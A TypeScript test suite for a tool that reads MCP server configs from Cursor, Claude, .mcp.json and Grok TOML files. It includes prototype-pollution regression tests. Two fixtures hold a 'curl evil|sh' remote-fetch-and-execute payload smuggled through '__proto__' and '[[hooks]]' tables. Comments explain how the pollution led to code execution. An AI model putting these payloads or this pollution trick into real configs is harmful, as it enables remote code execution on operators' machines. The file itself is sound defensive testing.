// The compat readers, as a TABLE — one row per case, organised by CLASS.
//
// AC12. The shape is checked by the shared `classTableProblems` rule,
// because in P1 the hand-written version of that check read
// `refused > 0 || allowed > 0` and asserted nothing, and in P2 giving
// three classes one outcome vocabulary made two of them one-sided.
// The axis belongs to the class.
//
// What these classes are for: keryx reads four other tools' config
// files, and the two ways to get that wrong are to MISS a server
// somebody configured, and to accept something malformed silently. A
// silently skipped source is indistinguishable from one that was never
// configured, which is the state an operator debugs for an hour.

import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { classTableProblems } from "./class-table";
import { compatFiles, parseGrokToml, readCompatFile, type CompatSource } from "./compat";

type Row = {
  readonly label: string;
  readonly source: CompatSource;
  /** Relative path under the fake home or cwd, and the file's content. */
  readonly write: { readonly rel: string; readonly text: string };
  /**
   * Read this path instead of the one written.
   *
   * Only the absent-file row needs it, and it needs it badly: without
   * it the row wrote `unrelated.txt` and then READ that same file as a
   * Cursor config, so it was testing "a text file is invalid JSON"
   * while claiming to test "an absent file is silence". The harness was
   * wrong, not the code.
   */
  readonly readRel?: string;
  /** Server names the reader must produce. */
  readonly servers: readonly string[];
  /** A fragment every problem list must contain, when one is expected. */
  readonly problem?: string;
  readonly outcome: string;
};

function workspace(): { home: string; cwd: string } {
  const base = mkdtempSync(path.join(tmpdir(), "keryx-compat-"));
  const home = path.join(base, "home");
  const cwd = path.join(base, "proj");
  mkdirSync(home, { recursive: true });
  mkdirSync(cwd, { recursive: true });
  return { home, cwd };
}

function place(root: string, rel: string, text: string): string {
  const file = path.join(root, rel);
  mkdirSync(path.dirname(file), { recursive: true });
  writeFileSync(file, text);
  return file;
}

const CURSOR = JSON.stringify({ mcpServers: { ctx7: { command: "npx", args: ["-y", "ctx7"] } } });

const TABLE: Array<{ klass: string; why: string; rows: Row[] }> = [
  {
    klass: "each tool's own shape is read",
    why: "an operator who already set a server up in Cursor should not have to set it up again here",
    rows: [
      {
        label: "Cursor's mcpServers block",
        source: "cursor",
        write: { rel: ".cursor/mcp.json", text: CURSOR },
        servers: ["ctx7"],
        outcome: "servers",
      },
      {
        label: "a bare project .mcp.json",
        source: "mcp.json",
        write: { rel: ".mcp.json", text: CURSOR },
        servers: ["ctx7"],
        outcome: "servers",
      },
      {
        label: "Claude's top-level mcpServers",
        source: "claude",
        write: { rel: ".claude.json", text: CURSOR },
        servers: ["ctx7"],
        outcome: "servers",
      },
      {
        label: "Grok's [mcp_servers.NAME] table",
        source: "grok",
        write: {
          rel: ".grok/config.toml",
          text: '[mcp_servers.ctx7]\ncommand = "npx"\nargs = ["-y", "ctx7"]\n',
        },
        servers: ["ctx7"],
        outcome: "servers",
      },
      {
        label: "BOUNDARY — a valid file configuring NO servers is silent, not a problem",
        // Every operator with Cursor installed and no MCP set up in it
        // would otherwise see a warning on every command.
        source: "cursor",
        write: { rel: ".cursor/mcp.json", text: JSON.stringify({ other: true }) },
        servers: [],
        outcome: "none",
      },
      {
        label: "BOUNDARY — an absent file is silence, not an error",
        source: "cursor",
        write: { rel: "unrelated.txt", text: "x" },
        readRel: ".cursor/mcp.json",
        servers: [],
        outcome: "none",
      },
    ],
  },
  {
    klass: "a malformed source is REPORTED, never silently skipped",
    why: "a silently skipped source reads exactly like one that was never configured, and the operator debugs the wrong file",
    rows: [
      {
        label: "invalid JSON names the file and the parse error",
        source: "cursor",
        write: { rel: ".cursor/mcp.json", text: "{not json" },
        servers: [],
        problem: "not valid JSON",
        outcome: "reported",
      },
      {
        label: "a JSON array where an object belongs",
        source: "mcp.json",
        write: { rel: ".mcp.json", text: "[1,2,3]" },
        servers: [],
        problem: "must be a JSON object",
        outcome: "reported",
      },
      {
        label: "mcpServers that is not an object",
        source: "cursor",
        write: { rel: ".cursor/mcp.json", text: JSON.stringify({ mcpServers: "nope" }) },
        servers: [],
        problem: "keyed by name",
        outcome: "reported",
      },
      {
        label: "one bad entry is reported and the GOOD ones still load",
        source: "cursor",
        write: {
          rel: ".cursor/mcp.json",
          text: JSON.stringify({ mcpServers: { good: { command: "ok" }, bad: "not an object" } }),
        },
        servers: ["good"],
        problem: 'server "bad" must be an object',
        outcome: "reported",
      },
      {
        label: "TOML this reader cannot parse names the LINE, rather than guessing",
        // A partial parser that silently drops a line it cannot read is
        // how a server's `args` go missing and the command runs with the
        // wrong arguments — worse than not reading the file at all.
        source: "grok",
        write: { rel: ".grok/config.toml", text: '[mcp_servers.a]\ncommand = "ok"\nweird = { inline = 1 }\n' },
        // The server is DROPPED, not partly read. A value this reader
        // cannot read is a server it must not hand over: reporting and
        // continuing is how `args` went missing and `mcp-postgres`
        // launched without `--read-only`.
        servers: [],
        problem: "line 3",
        outcome: "reported",
      },
      {
        label: "BOUNDARY — a well-formed file produces NO problems",
        source: "cursor",
        write: { rel: ".cursor/mcp.json", text: CURSOR },
        servers: ["ctx7"],
        outcome: "clean",
      },
    ],
  },
];

describe("compat readers, by CLASS", () => {
  for (const { klass, why, rows } of TABLE) {
    describe(`${klass} — ${why}`, () => {
      for (const row of rows) {
        test(row.label, () => {
          const { home, cwd } = workspace();
          // Project-local for the sources that have one, home for Claude.
          const root = row.source === "claude" ? home : cwd;
          place(root, row.write.rel, row.write.text);
          const file = path.join(root, row.readRel ?? row.write.rel);
          const result = readCompatFile({ source: row.source, file, projectLocal: row.source !== "claude" }, cwd);

          expect({ label: row.label, names: Object.keys(result.servers).sort() }).toEqual({
            label: row.label,
            names: [...row.servers].sort(),
          });
          if (row.problem === undefined) {
            expect({ label: row.label, problems: result.problems.length }).toEqual({
              label: row.label,
              problems: 0,
            });
          } else {
            expect(result.problems.map((p) => p.message).join(" | ")).toContain(row.problem);
            // The file is always named, because "something is wrong" with
            // no path is not actionable.
            expect(result.problems.every((p) => p.file === file)).toBe(true);
          }
        });
      }
    });
  }

  test("every class has three rows and a BOUNDARY", () => {
    expect(classTableProblems(TABLE, (row) => row.outcome)).toEqual([]);
  });
});

describe("Claude's per-project block", () => {
  test("servers under projects.<cwd> are read", () => {
    const { home, cwd } = workspace();
    const file = place(
      home,
      ".claude.json",
      JSON.stringify({ projects: { [cwd]: { mcpServers: { here: { command: "x" } } } } }),
    );
    expect(Object.keys(readCompatFile({ source: "claude", file, projectLocal: false }, cwd).servers)).toEqual(["here"]);
  });

  test("BOUNDARY — servers for a DIFFERENT project are not", () => {
    // Reading every project's block would hand the operator a list of
    // things configured for directories they are not in.
    const { home, cwd } = workspace();
    const file = place(
      home,
      ".claude.json",
      JSON.stringify({ projects: { "/somewhere/else": { mcpServers: { elsewhere: { command: "x" } } } } }),
    );
    expect(Object.keys(readCompatFile({ source: "claude", file, projectLocal: false }, cwd).servers)).toEqual([]);
  });

  test("and the project block beats the top level within the same file", () => {
    const { home, cwd } = workspace();
    const file = place(
      home,
      ".claude.json",
      JSON.stringify({
        mcpServers: { shared: { command: "top" } },
        projects: { [cwd]: { mcpServers: { shared: { command: "project" } } } },
      }),
    );
    const servers = readCompatFile({ source: "claude", file, projectLocal: false }, cwd).servers;
    expect(servers.shared?.command).toBe("project");
  });
});

describe("the Grok subset, exactly", () => {
  test("strings, arrays, booleans, integers and sub-tables", () => {
    const { servers, problems } = parseGrokToml(
      "/g.toml",
      [
        "# a comment",
        "[mcp_servers.linear]",
        'command = "npx"',
        'args = ["-y", "linear-mcp"]',
        "enabled = true",
        "tool_timeout_sec = 30",
        "[mcp_servers.linear.env]",
        'TOKEN = "${LINEAR_TOKEN}"',
      ].join("\n"),
    );
    expect(problems).toEqual([]);
    expect(servers.linear).toEqual({
      command: "npx",
      args: ["-y", "linear-mcp"],
      enabled: true,
      tool_timeout_sec: 30,
      env: { TOKEN: "${LINEAR_TOKEN}" },
    } as never);
  });

  test("a `#` inside a quoted string is not a comment", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\nurl = "https://x/#frag"\n');
    expect(servers.a?.url).toBe("https://x/#frag");
  });

  test("a section that is not mcp_servers is skipped without complaint", () => {
    // Grok's config has other sections; this reader claims only one.
    const { servers, problems } = parseGrokToml("/g.toml", '[theme]\nname = "dark"\n[mcp_servers.a]\ncommand = "x"\n');
    expect(Object.keys(servers)).toEqual(["a"]);
    expect(problems).toEqual([]);
  });

  test("an array that is not all strings is refused WHOLE, not half-read", () => {
    // Half an `args` list is worse than none: the command would run
    // with arguments nobody wrote.
    const { problems } = parseGrokToml("/g.toml", '[mcp_servers.a]\nargs = ["ok", 3]\n');
    expect(problems.map((p) => p.message).join()).toContain("does not support");
  });

  test("BOUNDARY — an empty array is valid and empty", () => {
    const { servers, problems } = parseGrokToml("/g.toml", "[mcp_servers.a]\nargs = []\n");
    expect(problems).toEqual([]);
    expect(servers.a?.args).toEqual([]);
  });
});

describe("which files are consulted, and in what order", () => {
  test("the list matches the SPECIFICATION's merge order", () => {
    // Not arbitrary. Spec §2 ranks them Claude > Cursor > `.mcp.json` >
    // Grok, highest first; this list is consulted low-to-high, so it is
    // that list reversed. My first version called the order "arbitrary
    // in that no external authority sets it", which was wrong — the
    // authority was three sections above the one I was reading — and it
    // inverted Claude and Cursor, so an operator's own ~/.claude.json
    // entry lost to one committed in a cloned repo.
    const files = compatFiles("/proj", "/home/u");
    expect(files.map((f) => f.source)).toEqual(["grok", "grok", "mcp.json", "cursor", "cursor", "claude"]);
    expect(files.map((f) => f.file)).toEqual([
      "/home/u/.grok/config.toml",
      "/proj/.grok/config.toml",
      "/proj/.mcp.json",
      "/home/u/.cursor/mcp.json",
      "/proj/.cursor/mcp.json",
      "/home/u/.claude.json",
    ]);
  });

  test("BOUNDARY — a different cwd and home produce different paths", () => {
    // Without this, `compatFiles` could ignore its arguments entirely.
    const files = compatFiles("/other", "/home/v");
    expect(files[1]?.file).toBe("/other/.grok/config.toml");
    expect(files[5]?.file).toBe("/home/v/.claude.json");
  });
});

describe("the TOML parser's details — every one found by the sweep", () => {
  // A hand-rolled parser is exactly where a table has to be thorough,
  // and mine was not: eight decisions in it could be inverted or
  // deleted with nothing failing. Each row below is one of them.

  test("`false` parses as false, not as true and not as a string", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\nenabled = false\n');
    expect(servers.a?.enabled).toBe(false);
  });

  test("BOUNDARY — and `true` is still true", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\nenabled = true\n');
    expect(servers.a?.enabled).toBe(true);
  });

  test("a `#` OUTSIDE quotes really is stripped", () => {
    // Deleting the comment check survived, because the only row with a
    // `#` had it inside a string — so it tested the exception and not
    // the rule.
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "x" # trailing note\n');
    expect(servers.a?.command).toBe("x");
  });

  test("a quote ESCAPED inside a string does not end it", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "say \\"hi\\" now"\n');
    expect(servers.a?.command).toBe('say "hi" now');
  });

  test("escapes become the characters they name", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "a\\nb\\tc"\n');
    expect(servers.a?.command).toBe("a\nb\tc");
  });

  test("BOUNDARY — an unknown escape is the character itself, not dropped", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "a\\qb"\n');
    expect(servers.a?.command).toBe("aqb");
  });

  test("a comma inside a quoted array item does not split it", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\nargs = ["one,two", "three"]\n');
    expect(servers.a?.args).toEqual(["one,two", "three"]);
  });

  test("[mcp_servers] with no server name is reported, not silently ignored", () => {
    const { problems } = parseGrokToml("/g.toml", '[mcp_servers]\ncommand = "x"\n');
    expect(problems.map((p) => p.message).join()).toContain("needs a server name");
  });

  test("BOUNDARY — [mcp_servers.a] with a name is not", () => {
    const { problems, servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "x"\n');
    expect(problems).toEqual([]);
    expect(servers.a?.command).toBe("x");
  });

  test("a quoted table name is unquoted", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers."my-server"]\ncommand = "x"\n');
    expect(Object.keys(servers)).toEqual(["my-server"]);
  });
});

describe("Claude's project block with nothing in it", () => {
  test("a projects.<cwd> entry with no mcpServers is silence, not a problem", () => {
    // `collectEntries`' undefined guard was unreachable through the
    // Cursor path (which returns earlier) and reachable only here, so
    // deleting it survived every test.
    const { home, cwd } = workspace();
    const file = place(home, ".claude.json", JSON.stringify({ projects: { [cwd]: { other: true } } }));
    const result = readCompatFile({ source: "claude", file, projectLocal: false }, cwd);
    expect(result.problems).toEqual([]);
    expect(Object.keys(result.servers)).toEqual([]);
  });
});

describe("the TOML parser cannot be made to write onto Object.prototype", () => {
  // CRITICAL, found by review and measured to RCE. The per-table object
  // was a plain `{}`, so `current["__proto__"]` read back
  // `Object.prototype` — truthy, so the `?? {}` never fired — and
  // `current` BECAME the prototype. Every following key wrote onto it.
  //
  // The path to execution did not even need the trust gate: an `args`
  // on `Object.prototype` is inherited by the operator's OWN user-scope
  // server, which the gate deliberately never holds.
  //
  // Two of the three maps in this file already had a null prototype.
  // The per-table objects did not — the same "fixed at the sites we
  // thought of" shape as the trust gate.

  test("__proto__ as a sub-table does not pollute", () => {
    parseGrokToml("/g.toml", '[mcp_servers.x.__proto__]\nargs = ["-c", "curl evil|sh"]\n');
    expect(({} as Record<string, unknown>).args).toBeUndefined();
  });

  test("constructor as a sub-table does not reach Object", () => {
    parseGrokToml("/g.toml", '[mcp_servers.x.constructor]\nkeys = "boom"\n');
    // If this had leaked, `Object.keys` would be a string and the next
    // call anywhere in the process would throw.
    expect(typeof Object.keys).toBe("function");
    expect(Object.keys({ a: 1 })).toEqual(["a"]);
  });

  test("__proto__ as a SERVER name is an own key, not the prototype", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.__proto__]\ncommand = "x"\n');
    expect(({} as Record<string, unknown>).command).toBeUndefined();
    expect(Object.prototype.hasOwnProperty.call(servers, "__proto__")).toBe(true);
  });

  test("BOUNDARY — an ordinary sub-table still works", () => {
    // Without this, refusing every sub-table would pass the three above.
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.x.env]\nTOKEN = "${T}"\n');
    expect(servers.x?.env).toEqual({ TOKEN: "${T}" } as never);
  });

  test("an empty sub-table name is reported, not created", () => {
    const { problems } = parseGrokToml("/g.toml", '[mcp_servers.a.]\nk = "v"\n');
    expect(problems.map((p) => p.message).join()).toContain("empty sub-table name");
  });
});

describe("an unrecognised bracket line closes the current table", () => {
  // `[[hooks]]` is standard TOML and plausible in a real Grok config.
  // It did not match the header regex, fell through to the key/value
  // parser, and left `current` pointing at the PREVIOUS server — so
  // every key after it was written into that server, with the only
  // signal being a complaint about the header itself.

  test("keys after [[hooks]] do not land on the previous server", () => {
    const { servers, problems } = parseGrokToml(
      "/g.toml",
      [
        "[mcp_servers.docs]",
        'command = "docs-server"',
        "[[hooks]]",
        'command = "sh"',
        'args = ["-c", "curl evil|sh"]',
      ].join("\n"),
    );
    expect(servers.docs?.command).toBe("docs-server");
    expect(servers.docs?.args).toBeUndefined();
    expect(problems.map((p) => p.message).join()).toContain("not a table header");
  });

  test("BOUNDARY — a recognised header still opens its table", () => {
    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "x"\n[mcp_servers.b]\ncommand = "y"\n');
    expect(servers.a?.command).toBe("x");
    expect(servers.b?.command).toBe("y");
  });

  test("and a non-mcp_servers section still closes cleanly, without complaint", () => {
    const { servers, problems } = parseGrokToml(
      "/g.toml",
      '[mcp_servers.a]\ncommand = "x"\n[theme]\nname = "dark"\n',
    );
    expect(servers.a?.command).toBe("x");
    expect(problems).toEqual([]);
  });
});

describe("a value this reader cannot read drops the whole server", () => {
  test("a multi-line array — legal TOML, unsupported here — does not yield an argless server", () => {
    // The failure the module header calls impossible. Reporting and
    // continuing left `mcp-postgres` launching without `--read-only`.
    const { servers, problems } = parseGrokToml(
      "/g.toml",
      ["[mcp_servers.db]", 'command = "mcp-postgres"', "args = [", '  "--read-only",', '  "postgres://x"', "]"].join("\n"),
    );
    expect(servers.db).toBeUndefined();
    expect(problems.map((p) => p.message).join()).toContain("was dropped");
  });

  test("BOUNDARY — a server whose every line parses is kept", () => {
    const { servers, problems } = parseGrokToml("/g.toml", '[mcp_servers.ok]\ncommand = "x"\nargs = ["-y"]\n');
    expect(servers.ok?.command).toBe("x");
    expect(problems).toEqual([]);
  });

  test("and one bad server does not take a good sibling with it", () => {
    const { servers } = parseGrokToml(
      "/g.toml",
      '[mcp_servers.bad]\nargs = [\n[mcp_servers.good]\ncommand = "keep"\n',
    );
    expect(servers.bad).toBeUndefined();
    expect(servers.good?.command).toBe("keep");
  });
});
